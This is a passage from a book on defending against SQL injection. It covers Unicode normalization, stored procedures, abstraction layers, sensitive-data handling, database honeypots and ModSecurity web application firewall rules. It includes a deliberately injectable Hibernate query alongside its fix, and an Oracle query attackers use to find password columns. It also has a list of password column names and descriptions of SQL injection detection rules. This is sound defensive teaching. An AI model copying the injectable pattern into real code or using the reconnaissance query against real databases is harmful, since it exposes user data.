potentially repeated several times. This approach can be error -prone, however, as you will need to perform a check after each decoding \nstep to determine whether the input still contains encoded data. A more realistic approach may \nbe to decode the input once, and then reject the data if it still contains encoded characters. This approach assumes that genuine input will not contain double -encoded va lues, which should be \na valid assumption in most cases.  \nWorking with Unicode  \nWhen working with Unicode input such as UTF -8, one approach is normalization of the input. \nThis converts the Unicode input into its simplest form, following a defined set of rules . \nUnicode normalization differs from canonicalization in that there may be multiple normal forms of a Unicode character according to which set of rules is followed. The recommended form of normalization for input validation purposes is NFKC (Normalization Form KC —\nCompatibility Decomposition followed by Canonical Composition). You can find more information on normalization forms at www.unicode.org/reports/tr15.  \nThe normalization process will decompose the Unicode character into its representative \ncomponents, and then reassemble the character in its simplest form. In most cases, it will transform double -width and other Unicode encodings into their ASCII equivalent s, where they \nexist.  \nYou can normalize input in Java with the \nNormalizer  class (since Java 6) as follows:  \nnormalized = Normalizer.normalize(input, Normalizer.Form.NFKC);  \nYou can normalize input in C# with the Normalize  method of the String  class as follows:  \nnormalized = input.Normalize(NormalizationForm.FormKC);  \nYou can normalize input in PHP with the PEAR::I18N_UnicodeNormalizer package from \nthe PEAR repository, as follows:  \n$normalized = I18N_UnicodeNormalizer::toNFKC($input, ‘UTF- 8’); \nAnot her approach is to first check that the Unicode is valid (and is not an invalid \nrepresentation), and then to convert the data into a predictable format —for example, a Western \nEuropean character set such as ISO -8859 -1. The input would then be used in that f ormat within \nthe application from that point on. This is a deliberately lossy approach, as Unicode characters that cannot be represented in the character set converted to will normally be lost. However, for \nthe purposes of making input validation decisions , it can be useful in situations where the \napplication is not localized into languages outside Western Europe.  \nYou can check for Unicode validity for UTF -8 encoded Unicode by applying the set of \nregular expressions shown in Table 8.7. If the input matches any of these conditions it should \nbe a valid UTF -8 encoding. If it doesn’t match, the input is not a valid UTF -8 encoding and \nshould be rejected. For other types of Unicode, you should consult the documentation for th e \nframework you are using to determine whether functionality is available for testing the validity of input. \nTable 8.7  UTF -8 Parsing Regular Expressions  \nRegular Expression  Descriptio n \n[x00-\\x7F] ASCII  \n[\\xC2-\\xDF][\\x80-\\xBF] Two-byte representation  \n\\xE0[\\xA0-\\xBF][\\x80-\\xBF] Two-byte representation  \n[\\xE1-\\xEC\\xEE\\xEF][\\x80-\\xBF]{2}  Three- byte representation  \n\\xED[\\x80-\\x9F][\\x80-\\xBF] Three- byte representation  \n\\xF0[\\x90-\\xBF][\\x80-\\xBF]{2}  Planes 1 –3 \n[\\xF1-\\xF3][\\x80-\\xBF]{3}  Planes 4 –15 \n\\xF4[\\x80-\\x8F][\\x80-\\xBF]{2}  Plane 16  \nNow that you have checked that the input is validly formed, you can convert it to a \npredictable format —for example, converting a Unicode UTF -8 string to another character set \nsuch as ISO -8859- 1 (Latin 1). \nIn Java, you can use the CharsetEncoder  class, or the simpler string method getBytes()  (Java 6 \nand later) as follows:  \nstring ascii = utf8.getBytes(“ISO- 8859-1”); \nIn C#, you can use the Encoding.Convert  class as follows:  \nbyte[] asciiBytes = Encoding.Convert(Encoding.UTF8, Encoding.ASCII, utf8Bytes);  \nIn PHP, you can do this with utf8_decode  as follows:  \n$ascii = utf8_decode($utf8string);  \nDesign Techniques to A void the Dangers of SQL \nInjection  \nThe material in the solutions I’ve described in this chapter comprises patterns that you can use \nto secure your applications against SQL injection, and in most cases they are techniques you can apply to both an application under development and an existing application, albeit with \nsome rework to the original application’s architecture. This solution is intended to provide a number of higher -level design techniques to avoid or mitigate the dangers of SQL injection. \nBeing at the design level, however, these techniques are more beneficial to new development, \nas significantly rearchitecting an existing application to incorporate different design techniques could require a great deal of effort.  \nEach design technique we’ll discuss  in the subsections that follow can be implemented in \nisolation; however, for best results it is recommended that you implement all of these techniques together with the techniques outlined earlier in the chapter, where appropriate, to provide true defense  in depth against SQL injection vulnerabilities.  \nUsing Stored Procedures  \nOne design technique that can prevent or mitigate the impact of SQL injection is to design the application to exclusively use stored procedures for accessing the database. Stored proc edures \nare programs stored within the database, and you can write them in a number of different \nlanguages and variants depending on the database, such as SQL (PL/SQL for Oracle, Transact -\nSQL for SQL Server, and SQL:2003 standard for MySQL), Java (Oracle), or others.  \nStored procedures can be very useful for mitigating the seriousness of a potential SQL \ninjection vulnerability, as it is possible to configure access controls at the database level when \nusing stored procedures on most databases. This is important, because it means that if an exploitable SQL injection issue is found, the attacker should not be able to access sensitive information within the database if the permissions are correctly configured.  \nThis happens because dynamic SQL, due to its dynamic n ature, requires more permissions \non the database than the application strictly needs. As dynamic SQL is assembled at the application, or elsewhere in the database, and is then sent to the database for execution, all data within the database that needs to be readable, writable, or updateable by the application needs to be accessible to the database user account that is used to access the database. Therefore, when an SQL injection issue occurs, the attacker can potentially access all of the information within  the database that is accessible to the application, as the attacker will have the database \npermissions of the application. \nWith the use of stored procedures, you can change this situation. In this case, you would \ncreate stored procedures to perform all of the database access the application needs. The database user that the application uses to access the database is given perm issions to execute \nthe stored procedures that the application needs, but does not have any other data permissions within the database (i.e. the user account does not have \nSELECT , INSERT , or UPDATE  rights to any of \nthe application’s data, but does have EXECUTE  rights on the stored procedures). The stored \nprocedures then access the data with differing permissions —for example, the permissions of \nthe user who created the procedure rather than the user invoking the procedure —and can \ninteract with the application  data as necessary. This can help you to mitigate the impact of an \nSQL injection issue, as the attacker will be limited to calling the stored procedures, therefore limiting the data the attacker can access or modify, and in many cases preventing the attack er \nfrom accessing sensitive information in the database . \nDamage & defense…  \nSQL Injection in Stored Procedures  \nIt is often assumed that SQL injection can happen only at the application level —for example, in a Web \napplication. This is incorrect, as SQL injec tion can occur at any level where dynamic SQL is used, including at \nthe database level. If unsanitized user input is submitted to the database— for example, as a parameter to a stored \nprocedure —and then it is used in dynamic SQL, SQL injection can occur at the database level as easily as at any \nother level.  \nTherefore, you should be careful when handling untrusted input at the database level, and you should avoid \ndynamic SQL wherever possible. In situations where stored procedures are in use, the use of dynam ic SQL can \noften indicate that additional procedures should be defined at the database level to encapsulate missing logic, \ntherefore enabling you to avoid the use of dynamic SQL within the database at all.  \nUsing Abstraction Layers  \nWhen designing an enterpr ise application it is a common practice to define various layers for \npresentation, business logic, and data access, allowing the implementation of each layer to be \nabstracted from the overall design. Depending on the technology in use, this may involve an additional data access abstraction layer such as Hibernate, ActiveRecord, or Entity Framework. For many of these frameworks developers will not have to write a single line of SQL in the application. Another type of abstraction layer is to use a database ac cess framework such as \nADO.NET, JDBC, or PDO. Both of these layers of abstraction can be a very useful place for the security -aware designer to enforce safe data access practices that will then be used \nthroughout the rest of the architecture.  \nA good exampl e of this would be a data access layer that ensures that all database calls are \nperformed through the use of parameterized statements. Examples of using parameterized statements in a number of technologies (including those mentioned earlier) are provided i n \n“Using parameterized statements” earlier in this chapter. Providing that the application did not access the database in any way other than the data access layer, and that the application did not then use the supplied information in dynamic SQL at the dat abase level itself, SQL injection is \nunlikely to be present. Even more powerful would be to combine this method of accessing the database with the use of stored procedures, as this would mitigate the risk even further. This may also have the effect of easi ng implementation of a secure database layer, as in that case all \nof the methods of accessing the database will have been defined, and would therefore be easier \nto implement in a well- designed data access layer . \nDamage & defense…  \nQuery Languages Provided b y Abstraction Layers  \nSome abstraction layers introduce their own query languages and these constructs may also be subject to injection \nattacks. As an example Hibernate has a query language called HQL. The developer can create complex queries \nusing HQL, joi ning data from several tables and filtering based on data. The following is a simple example \nwritten in Java:  \nsession.createQuery(“from Users u where u.username = ’” + username + “’”)  \nThe code in this example is clearly injectable using single quotes. As explained in the parameterized \nstatements section however, parameterized queries are available also when using HQL. When can use named \nparameters in our query and set their values in the following statements:  \nQuery query = session.createQuery(“from Users user where user.username =:username”);  \nquery.setString(“username”, username);  \nList results = query.list();  \nIn this example we allow the Hibernate framework to encode that data for us —just like when using \nparameterized statements with SQL.  \nHandling Sensitive Data  \nA final technique for mitigating the seriousness of SQL injection is to consider the storage and \naccess of sensitive information within the database. One of the goals of an attacker is to gain access to the data that is held within the database—often because that data will have some \nform of monetary value. Examples of the types of information an attacker may be interested in obtaining may include usernames and passwords, personal information, or financial information such as credit card details. Becaus e of this, it is worth considering additional \ncontrols over sensitive information. Some example controls or design decisions to consider might be the following:  \n• Passwords:  Where possible, you should not store users’ passwords within the database. A \nmore secure alternative is to store a salted one- way hash (using a secure hash algorithm such \nas SHA256) of each user’s password instead of the password itself. The salt, which is  an \nadditional small piece of random data, should then ideally be stored separately from the password hash. In this case, instead of comparing a user’s password to the one in the database during the login process, you would compare the salted hash calculat ed from the \ndetails supplied by the user to the value stored in the database. Note that this will prevent the \napplication from being able to e -mail the user his existing password when he forgets it; in \nthis case, it would be necessary to generate a new, secure password for the user and provide \nthat to him instead.  \n• Credit card and other financial information:  You should store details such as credit cards \nencrypted with an approved (i.e. FIPS -certified) encryption algorithm. This is a requirement \nof the Pay ment Card Industry Data Security Standards (PCI -DSS) for credit card \ninformation. However, you should also consider encrypting other financial information that may be in the application, such as bank account details. The encryption key should not be stored  in the database.  \n• Archiving:  Where an application is not required to maintain a full history of all of the \nsensitive information that is submitted to it (e.g. personally identifiable information), you should consider archiving or removing the unneeded information after a reasonable period of time. Where the application does not require this information after initial processing, you should archive or remove unneeded information immediately. In this case, removing information where the exposure would be a m ajor privacy breach may reduce the impact of \nany future security breach by reducing the amount of customer information to which an attacker can gain access.  \nNotes from the underground…  \nNotes from an Incident Response  \nOne of the more interesting incident response engagements an author of this book was involved with was with a \nfairly large regional bank in the northeast region of the United States. The client (a bank) had noticed that \nsomething odd was going on when their server administrator saw that the logs for one day were several times \nlarger than they normally expected. As such, they looked into it, and fairly quickly determined that they were the \nvictims of an SQL injection exploit.  \nIn this case, the exploit vector was fairly innocuous —it was an identif ier that the application used to determine \nwhich press release the user wanted to read in the “News” section of the Web site. Unfortunately for the client, \nthe press release detail was not the only information stored in that database. Also stored in that d atabase were the \nmortgage application details of every customer of the bank who had applied for a mortgage through the Web site, \nincluding full names, Social Security numbers, phone numbers, address history, job history, and so forth—in \nother words, everyt hing needed for identity theft, for almost 10,000 customers.  \nThe bank in question ended up writing to every one of its customers to apologize, and also provided all of the \naffected customers with complimentary identity theft protection. But had the bank pa id some attention to where \nits sensitive information was stored before the exploit happened the exploit probably would not have been nearly \nas serious as it was.  \nAvoiding Obvious Object Names  \nFor security reasons, you should be careful with your choice of names for critical objects such \nas encryption functions, password columns, and credit card columns. \nMost application developers will use obvious column names, such as password, or a \ntranslated version such as kennwort  (in German). On the other side, most a ttackers are aware \nof this approach and will search for interesting columns names (such as password) in the appropriate views of the database. Here’s an example on Oracle:  \nSELECT owner||‘.’||column_name FROM all_tab_columns WHERE upper(column_name)LIKE ‘%PASSW%’)  \nThe information from the table containing passwords or other sensitive information will be \nselected in the next step of the attack. To see some examples of the types of naming to avoid, refer to Table 8.8, which lists common variations and translations for the word password. \nTable 8.8  Password  in Different Languages  \nWord for Password  Language  \npassword, pwd, passw  English  \npasswort , kennwort  German  \nMotdepasse , mdp  French  \nWachtwoord Dutch  \nSenha Portuguese  \nWord for Password  Language  \nHaslo  Polish  \nTo make the attack more difficult, it could be a good idea to use an unobvious table and \ncolumn name for saving password information. Although this technique will not stop an \nattacker from finding and accessing the data, it will ensure that the attacker wi ll not be able to \nidentify this information immediately.  \nSetting up Database Honeypots  \nTo become alerted if someone tries to read the passwords from the database, you could set up an additional honeypot table with a password column that contains fake data.  If this fake data \nwere selected, the administrator of the application would receive an e- mail. In Oracle, you \ncould implement such a solution by using a virtual private database (VPD), as in the following example:  \n-- create the honeypot table  \nCreate table app_user.tblusers (id number, name varchar2(30), passwordvarchar2(30));  \n-- create the policy function sending an e -mail to the administrator  \n-- this function must be created in a different schema, e.g., secuser  \ncreate or replace secuser.function get_cust_id  \n(p_schema in varchar2,  \np_table in varchar2  \n)return varchar2  \nasv_connection UTL_SMTP.CONNECTION;  \nbegin v_connection:= UTL_SMTP.OPEN_CONNECTION(‘mailhost.victim.com’,25);  \nUTL_SMTP.HELO(v_connection,‘mailhost.victim.com’);  \nUTL_SMTP.MAIL(v_connection,‘app@victim.com’);  \nUTL_SMTP.RCPT(v_connection,‘admin@victim.com’);  \nUTL_SMTP.DATA(v_connection,‘WARNING! SELECT PERFORMED ON HONEYPOT’);  \nUTL_SMTP.QUIT(v_connection);  \nreturn ‘1=1’; -- always show the entire table  \nend; \n/ \n-- assign the policy function to the honeypot table TBLUSERS  \nexec dbms_rls.add_policy (‘APP_USER’,  \n‘TBLUSERS’,  \n‘GET_CUST_ID’,  \n‘SECUSER’,  \n”, \n‘SELECT,INSERT,UPDATE,DELETE’);  \nAdditional Secure Development Resources  \nA number of resources exist to promote secur e applications by providing tools, resources, \ntraining, and knowledge to the developers writing those applications. The following is a list of \nthe resources the authors of this book feel are the most useful:  \n• The Open Web Application Security Project (OWA SP; www.owasp.org) is an open \ncommunity promoting Web application security. OWASP has a number of projects that provide resources, guides, and tools to assist developers in understanding, finding, and addressing securit y issues in their code. Notable projects are the Enterprise Security API \n(ESAPI), which provides a collection of API methods for implementing security requirements such as input validation, and the OWASP Development Guide, which provides a comprehensive gu ide for secure development.  \n• The 2009 CWE/SANS top 25 most dangerous programming errors \n(http://cwe.mitre.org/top25/index.html ) is a collaboration among MITRE, the SANS \nInstitute, and a number of top s ecurity experts. It is intended to serve as an educational and \nawareness tool for developers, and provides a lot of detail on the top 25 programming errors \nas defined by the project —one of which is SQL injection. \n• The SANS Software Security Institute ( www.sans -ssi.org ) provides training and certification \nin secure development, as well as a large amount of reference information and research contributed by SANS certified individuals. \n• Oracle’s tutorial on defending against SQL injection attacks ( http://st-\ncurriculum.oracle.com/tutorial/SQLInjection/index.htm) walks you through the tools and techniques for securing yourself against SQL injec tion. \n• SQLSecurity.com ( www.sqlsecurity.com ) is a site dedicated to Microsoft SQL Server \nsecurity, and contains resources for tackling SQL injection as well as other SQL Server security problems.  \n• Red -Database- Security ( www.red -database -security.com ) is a company specializing in \nOracle security. Its site has a large number of presentations and white papers on Oracle \nsecurity available for download. \n• Pete Finne gan Limited ( http://petefinnigan.com ) also provides a large amount of information \nfor securing Oracle databases.  \nSummary  \nIn this chapter, we examined several recommended techniques for securing an application against SQL injection. These techniques can all be effective in mitigating part of the problem; however, you will likely need to implement several of the techniques in this chapter to ensure effective protection. \nFor this reason, you should look at all of the solutions presented and determine where you \ncan integrate them into your application. If you cannot integrate a particular solution, determine whether there is an additional technique that you can use to provide the coverage you seek. Remember that each technique we discussed in this chapter should represent only one part of your defense -in-depth strategy for protecting your application at each level. \nConsider where you will use whitelist input validation with the application’s input gathering, \nwhere you will use output encoding between layers and before the database, how you will \nencode information coming from the database, how you will be canonicalizing and/or norma lizing data before validating it, and how data access to the database will be architected \nand implemented. All of these combined will keep you secure from SQL injection. \nSolutions fast track  \nDomain Driven Security  \n• SQL injection occurs because our application is mapping data incorrectly between different \nrepresentations of the data.  \n• By wrapping our data in validated value objects, and limiting access to raw data, we can \nenforce correct usage of the data.  \nUsing Para meterized Statements  \n• Dynamic SQL, or assembling an SQL query as a string containing user -controllable input \nand then submitting it to the database, is the primary cause of SQL injection vulnerabilities.  \n• You should use parameterized statements (also known as prepared statements) instead of \ndynamic SQL to assemble an SQL query safely.  \n• You can use parameterized statements only when you’re supplying data; you cannot use \nthem to supply SQL keywords or identifiers (such as table or column names).  \nValidating  Input  \n• Always use whitelist input validation (accepting only the “known good” input you are \nexpecting) where possible.  \n• Ensure that you validate the type, size, range, and content of all user -controllable input to the \napplication. \n• Use blacklist input validation (rejecting “known bad” or signature –based input) only when \nyou cannot use whitelist input validation. \n• Never use blacklist input validation on its own. Always combine it with output encoding at \nthe very least.  \nEncoding Output  \n• Ensure that SQL queries containing user -controllable input are encoded correctly to prevent \nsingle quotes or other characters from altering the query.  \n• If you’re using LIKE  clauses, ensure that LIKE  wildcards are appropriately encoded.  \n• Ensure that data received from th e database undergoes appropriate context -sensitive input \nvalidation and output encoding prior to use.  \nCanonicalization  \n• Input validation filters and output encoding should be performed after input has been \ndecoded or is in canonical form. \n• Be aware that there are multiple representations of any single character, and multiple ways to \nencode it.  \n• Where possible, use whitelist input validation and reject non- canonical forms of input. \nDesigning to Avoid the Dangers of SQL Injection  \n• Use stored procedures so  that you can have more granular permissions at the database level.  \n• You can use a data access abstraction layer to enforce secure data access across an entire \napplication. \n• Consider additional controls over sensitive information at design time.  \nFrequent ly Asked Questions  \nQ: Why can’t I use parameterized statements to supply table or column names?  \nA: You can’t supply SQL identifiers in a parameterized statement, as these are compiled at the \ndatabase and then filled in with the supplied data. This requires  the SQL identifiers to be \npresent at compile time, before the data is supplied.  \nQ: Why can’t I have a parameterized ORDER BY  clause?  \nA: This is for the same reason as for the previous question, as an ORDER BY  contains an SQL \nidentifier, namely the column to order by.  \nQ: How do I use parameterized statements in X technology with Y database?  \nA: The majority of modern programming languages and databases support parameterized \nstatements. Try looking at the document ation of the database access API you are using. \nRemember that these are sometimes referred to as prepared statements.  \nQ: How do I parameterize a stored procedure call?  \nA: In most programming languages, this is very similar to or the same as using a \nparamet erized statement. Try looking at the documentation of the database access API you are \nusing. These may be referred to as callable statements.  \nQ: Where can I get a good blacklist for validating X?  \nA: Unfortunately, what you would need to put in the blacklis t will be specific to the context of \nyour application. Also, you shouldn’t use blacklists, if possible, because you cannot blacklist \nevery potential attack or malicious input. If you must use blacklists, make sure you use output encoding as well, or that y ou are using blacklist input validation as only one of your validation \napproaches.  \nQ: So, if I use whitelist input validation, am I safe?  \nA: No. It depends on what you’re allowing through. For example, you may allow single quotes \nto be input, which will cr eate issues if that input is included in dynamic SQL.  \nQ: Where are good places to use whitelist input validation? Blacklist input validation?  \nA: You should use whitelist input validation in the application at the point the input is \naccepted, allowing you t o apply context -sensitive validation at that point. A good place to have \nblacklist validation is as an additional control at a Web application firewall or similar to enable you to detect obvious SQL injection hacking attempts.  \nQ: So, I need to encode input  to the database and from it as well? Why?  \nA: If you’re using dynamic SQL anywhere, you need to ensure that the content you are \nsubmitting to the database will not cause an SQL injection issue. This doesn’t mean that malicious content has been rendered saf e, though. It could be dangerous when queried from the \ndatabase and used in dynamic SQL elsewhere.  \nQ: At what point should I encode?  \nA: You should encode close to where you use the information. Therefore, you should encode \nwhen submitting information to th e database before it goes to the database. You should encode \ninformation that comes from the database as close to where it is used as possible; for example, \nbefore being presented to the user (encode for cross -site scripting), or before it is used in \ndynam ic SQL (encode for SQL injection).  \nQ: How do I perform canonicalization/normalization on input I’ve received in technology X?  \nA: Refer to your documentation of the framework in which you’re developing for \ncanonicalization and normalization support. Alterna tively, you could consider using an \nexternal framework such as icu for normalization or iconv to convert the input to ASCII if no other support is available. \nQ: Why is Unicode so complex with canonicalization?  \nA: Unicode allows a character to be represented in a multiple -byte form. Because of the way \nUnicode is generated, it is possible for there to be multiple representations of the same \ncharacter. It is also possible in cases where an out -of-date or badly implemented Unicode \ninterpreter is used, that addi tional invalid presentations of a character may also work.  \nQ: I can use dynamic SQL in a stored procedure, can’t I?  \nA: Yes. But be aware that you can have SQL injection in stored procedures as well. If you \nhave user -controllable information being included in a dynamic SQL query in a stored \nprocedure, you will be vulnerable.  \nQ: I use Hibernate, so I’m safe from SQL injection, right?  \nA: Wrong. Hibernate does encourage secure database access behavior, but it is still possible to \ncreate SQL injectable code in H ibernate, especially where you’re using native queries. Avoid \ndynamic SQL, and make sure you’re using parameterized statements with bound variables.  \n \n \n \nChapter 9  \nPlatform level defenses  \nJustin Clarke  \nSolutions in this chapter:  \n• Using Runtime Protection  \n• Securing the Database  \n• Additional Deployment Considerations  \nIntroduction  \nIn Chapter 8, we discussed practices and defenses that you can employ at the code level to \nprevent SQL injection. In this chapter, we’ll shift our focus to platform -level defenses that \ndetect, mitigate, and prevent SQL injection. A platform -level defense is any runtime \nenhancement or configuration change that can be made to increase the application’s overall \nsecurity. The scope of protection we’ll  cover in this chapter varies; however, as a whole the \ntechniques we’ll discuss can help you to achieve a multi -layered security architecture.  \nFirst we’ll examine runtime protection technologies and techniques, such as Web server \nplug-ins and leveraging application framework features. We’ll follow this with strategies for \nsecuring the data in the database, as well as the database itself, to help reduce the impact of exploitable SQL injection vulnerabilities. Lastly, we’ll look at what you can do at the infrastructure level to reduce the threat.  \nIt is important to remember that the solutions discussed in this chapter are not a substitute \nfor writing secure code, but are complementary. A hardened database does not stop SQL injection, but can make it significan tly more difficult to exploit, as well as helping to mitigate \nthe likely impact of the exploit. A Web application firewall or database firewall can serve as a virtual patch between vulnerability detection and code correction, as well as serving as a formid able defense against zero -day threats, such as automated mass -SQL injection attacks \nthat can infect hundreds or thousands of Web sites in a few days. Platform -level security is an \nimportant component to the overall security strategy for both existing and new applications.  \nUsing runtime protection  \nIn this section, we’ll consider runtime protection to be any security solution that you can use to \ndetect, mitigate, or prevent SQL injection that is deployable without recompiling the vulnerable application’s sour ce code. The solutions covered here are primarily software plug -\nins for Web servers and application frameworks (e.g. the .NET Framework, J2EE, PHP, etc.) or techniques for leveraging/extending features of the Web or application platform. The software solut ions we’ll discuss are open- source or free and are available for download on the \nInternet. We will not cover commercial products, although there are a number of commercial solutions available that implement one or more of the strategies and techniques disc ussed here \nand in most cases will have support and management options that may make them better options for enterprise environments. \nRuntime protection is a valuable tool for mitigating and preventing exploitation of known  \nSQL injection vulnerabilities. Fixing the vulnerable source code is always the ideal solution; however, the development effort required is not always feasible, practical, cost -effective, or \nunfortunately a high priority. Commercial off -the-shelf (COTS) applications are often \npurchased in compiled format, which eliminates the possibility of fixing the code. Even if uncompiled code is available for a COTS application, customizations may violate support contracts and/or prevent the software vendor from providing updates according to its norma l \nrelease cycle. Legacy applications close to retirement may not warrant the time and effort required to make the necessary code changes. Organizations may intend to make a code \nchange, but don’t have the resources in the near term to do so. These common s cenarios \nhighlight the need for runtime protection in the form of virtual patching or band- aid solutions. \nEven if the time and resources are available for code fixes, runtime protection can still be a \nvaluable layer of security to detect or thwart exploita tion of unknown SQL injection \nvulnerabilities. If the application has never undergone security code review or penetration testing, application owners might not be aware of the vulnerabilities. There is also the threat of “zero -day” exploit techniques as we ll as the latest and greatest SQL injection worm traversing \nthe Internet. In this way, runtime protection is not just a reactive defense mechanism, but also a proactive step toward comprehensively securing an application. \nAlthough runtime protection provides many benefits, you need to consider some of the costs \nthat may be involved. Depending on the solution, you should expect some level of performance degradation (as you would expect anytime additional processing and overhead are incurred). When evaluating  a solution, especially a commercial one, it is important to ask for \ndocumented performance statistics. The other point of caution is that some runtime solutions \nare more difficult to configure than others. If the solution is overly complex, the time and resources spent getting it to work may exceed the costs of actually fixing the code, or worse \nyet, you may decide not to use it at all. Ensure that the solution you select comes with detailed installation instructions, configuration examples, and support (t his doesn’t always mean paid \nsupport; some free solutions provide good online support through forums). The key  to getting \nthe most out of runtime protection is a willingness to learn the limitations of the technology and evaluate how it can best help you.  \nWeb Application Firewalls  \nThe most well- known runtime solution in Web application security is the use of a Web \napplication firewall (WAF). A WAF is a network appliance or software -based solution that \nadds security features to a Web application. Specificall y, we’re focusing on what WAFs can \noffer in terms of SQL injection protection.  \nSoftware -based WAFs are typically modules embedded into the Web server or application \nwith minimal configuration. Primary benefits of software -based WAFs are that the Web \ninfras tructure remains unchanged, and HTTP/HTTPS communications are handled seamlessly \nbecause they run inside the Web-  or application- hosting process. Appliance -based WAFs don’t \nconsume Web server resources and they can protect multiple Web applications of vary ing \ntechnologies. We will not cover network appliances any further, although you can use some of the software solutions as a network appliance when running on a Web server configured as a reverse proxy server.  \nNotes from the underground…  \nNeed Help Evaluati ng a WAF?  \nUnfortunately, the usefulness of WAFs is sometimes criticized; however, the criticism is usually targeted at a \nspecific implementation or commercial product. Regardless of how you feel about WAFs, they will be a mainstay \nof Web application securi ty, especially as standard bodies such as the Payment Card Industry (PCI) are endorsing \nthem as an option to satisfy Requirement 6.6.  \nTo help evaluate the various characteristics of a potential WAF solution, the Web Application Security \nConsortium (WASC) published the “Web Application Firewall Evaluation Criteria” (WAFEC) document \n(www.webappsec.org/projects/wafec/ ). This provides a good start point for beginning your evaluation of a WAF \nsolution.  \nUsing ModSecurity  \nThe de facto standard for WAFs is the open source ModSecurity ( www.modsecur ity.org/ ). \nModSecurity is implemented as an Apache module; however, it can protect virtually any Web \napplication (even ASP and ASP.NET Web applications) when the Apache Web server is configured as a reverse proxy. You can use ModSecurity for attack prevent ion, monitoring, \nintrusion detection, and general application hardening. We will use ModSecurity as the primary example for discussing key features in detecting and preventing SQL injection when using a WAF.  \nConfigurable Rule Set  \nWeb application environments are unique, and WAFs must be highly configurable to accommodate a wide variety of scenarios. The strength of ModSecurity is its rule language, which is a combination of configuration directives and a simple programing  language applied \nto HTTP requests a nd responses. The outcome is usually a specific action, such as allowing the \nrequest to pass, logging the request, or blocking it. Before looking at specific example, let’s first look at the generic syntax of the ModSecurity directive SecRule , as shown in Figure 9.1.  \n \nFigure 9.1  Generic Syntax for SecRule \nThe VARIABLE attribute tells ModSecurity where to look in the request or response, \nOPERATOR tells ModSecurity how to check this data, and ACTIONS  determines what to do \nwhen a match occurs. The ACTIONS  attribute is optional for a rule, as default global actions \ncan be defined.  \nYou can configure ModSecurity rules to achieve a negative (i.e. blacklist) or positive (i.e. \nwhitelist) security model when handling HTTP request data. Let’s look at Figure 9.2, which is \nan actual blacklis t SQL injection rule from the Generic Attacks rule file \n(modsecurity_crs_41_sql_injection_attacks.conf) of the ModSecurity Core Rule Set. The following bullets walk you through the rule and describe each configuration directive. For additional information on ModSecurity directives, refer to the official ModSecurity documentation at www.modsecurity.org/documentation/ . \n• The rule is a security rule ( SecRule), which is used to analyze data and perform a ctions based \non the results. \n\n• The rule will be applied to the request body ( phase:2). The specific targets for analysis on the \nrequest body are the request path ( REQUEST_FILENAME), all request parameter values \nincluding POST  data ( ARGS ), the request param eter names ( ARGS_NAMES ), all cookies \nincluded in the request ( REQUEST_COOKIES ), the cookie names \n(REQUEST_COOKIES_NAMES ), and all XML content included in the request ( XML:/∗). \n• Each target is matched against the regular expression pattern. Note that captu ring ( capture ) \nhas been enabled for this regular expression. This means data that matches the pattern in \nparentheses will be later accessible with substitution variables 0–9.  \n• Prior to the match, the request data is first subject to a number of translatio ns (denoted by the \nt: syntax), to help decode evasive encodings employed by the attacker. The first is t:none , \nwhich clears all previously set translation functions from previous rules, and the last is t:replaceComments , which replaces C -style comments (e.g. / ∗ comment ∗/) with a single \nspace. The in -between translation functions should be self -explanatory (refer to “ Request \nnormalization ” for more information about data translations). \n• ModSecurity is instructed that for this rule the response body will also be logged \n(ctl:auditLogParts=+E ). \n• Next, a successful match of the rule will result in the request being blocked ( block ). A \nmessage indicating that this is an SQL injection attack is added to the rule ( msg:‘SQL \nInjection Attack’ ) as well as a number of tags to classify the attack category in the log \n(tag:‘WEB_ATTACK/SQL_INJECTION’  through tag:‘PCI/6.5.2’ ). Additionally, part of the \nmatched data will also be logged ( logdata: ‘%{TX.0}’ ) via the capturing feature previo usly \nmentioned. All data is properly escaped before logging to avoid log -forging attacks.  \n• Successful matches are considered critical ( severity: ‘2’ ). \n• Successful matches will also increment or set a number of variables used within the \nModSecurity Core R ule Set to track anomaly matches against thresholds set by the user.  \n• The rule is also assigned a unique ID ( id:‘959052’ ) \n \nFigure 9.2  SQL Injection Rule from the Generic Attacks Rule File  \nThe ModSecurity Core Rule Set includes blacklist rules for SQL injection and blind SQL \ninjection, which, depending on the application, could generate false positives. Therefo re, the \ndefault behavior for these rules is increment anomaly scores that are used to track the \nprevalence of matched rules. In this way, the user can set anomaly thresholds that are appropriate to the application in order to avoid blocking legitimate requ ests with the out -of-\nthe-box rule set. This allows us to minimize instances of possible false positives without \naffecting normal application behavior and tune the rules so that we are comfortable setting them to block should we be faced with a zero- day thr eat. False positives are not unique to \nModSecurity; all WAFs will generate false positives if they are not properly tuned. ModSecurity’s Core Rule Set default behavior is preferable, as you want to monitor application behavior and tune rules and thresholds  before turning on active protection in \nproduction environments. If you are using ModSecurity to patch a known vulnerability, you can build a custom rule set that achieves positive security (whitelisting).  \nFigure 9.3 shows a custom whitelist rule that you can use to apply a virtual patch to a PHP \nscript. Requests to script.php must contain one parameter named statid  and the value must be a \nnumerical value from one to three digits long. With this patch in place, exploit ation of a SQL \ninjection vulnerability via the statid  parameter would not be possible. \n \nFigure 9.3  Whitelist Rule to Patch a Vulnerable PHP Script \nRequest Coverage \n\nSQL injection protection can be very tricky for a WAF. Attack payloads can manifest \nthemselves virtually anywhere within an HTTP request, such as the querystring, POST  data, \ncookies, custom and standard HTTP headers (e.g. Referer, Server, etc.), or even parts of the URL path. ModSecurity can handle any of these scenar ios. Figure 9.4 is an example list of \nvariables (i.e. targets for analysis) that ModSecurity supports. This should give you an idea of the comprehensive request -level protection that ModSecurity provides and that a WA F must \nimplement to adequately protect against SQL injection.  \n \nFigure 9.4  ModSecurity REQUEST  Variables  \nRequest Normalization  \nAttack strings can be encoded in a variety of ways to avoid detection and easily defeat simple input validation filters. ModSecurity is capable of handling virtually any complex encoding scenario, as it supports a wide variety of transfor mation functions and can apply those \nfunctions multiple times per rule and in any order. Figure 9.5 shows a list of transformation \nfunctions from the ModSecurity Reference Manual. \n\n \nFigure 9.5  ModSecurity Transformation Functions  \nIf for some reason built -in functions don’t meet your needs, you can build custom \ntransformation functions via ModSecurity’s support for the Lua scripting language.  \nResponse Analysis  \nAnother key feature of a WAF when it comes to mitigating SQL injection i s the ability to \nsuppress key information leakage, such as detailed SQL error messages. Refer to Figure 9.6, \n\nwhich is an actual outbound rule from the Outbound rule file \n(modsecurity_crs_50_outbound.conf) of the ModSe curity Core Rule Set.  \n \nFigure 9.6  SQL Errors Leakage Rule from the Outbound Rule File  \nIf the message in the response successfully matches against the regular expression \n(indicating that an SQL error has occurred), ModSecurity can respond appropriately, including responses such as suppressing the error from being returned to the attack or supplying an alternative  error code or message in order to confuse automated 